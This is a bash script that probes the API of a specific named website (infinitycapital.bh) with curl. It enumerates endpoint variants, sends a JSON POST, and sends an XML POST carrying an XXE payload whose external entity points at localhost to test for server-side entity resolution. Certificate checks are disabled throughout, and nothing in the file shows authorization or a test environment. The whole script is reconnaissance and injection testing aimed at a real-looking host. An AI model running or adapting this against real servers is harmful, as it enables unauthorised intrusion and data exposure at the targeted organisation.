#!/bin/bash
WD="$WORK_PATH"; cd "$WD" || exit 1
B="https://www.infinitycapital.bh"
G() { curl -sk -g -o /tmp/o.txt -w "%{http_code} sz=%{size_download} ct=%{content_type}\n" --max-time 20 "$1"; }

echo "== /api/ variants =="
G "$B/api/"
G "$B/api/?id=1"
G "$B/api/posts"
G "$B/api/v1/"
G "$B/api/health"
G "$B/api/graphql"

echo "== POST to /api/ with json =="
curl -sk -g -X POST -H "Content-Type: application/json" -d '{"test":1}' -o /tmp/p.txt -w "POST /api/ => %{http_code} sz=%{size_download}\n" "$B/api/"
head -c 120 /tmp/p.txt; echo

echo "== /api/ POST xml (XXE sink check) =="
curl -sk -g -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1/">]><r>&x;</r>' -o /tmp/x.txt -w "POST xml => %{http_code} sz=%{size_download}\n" "$B/api/"
head -c 120 /tmp/x.txt; echo
echo DONE
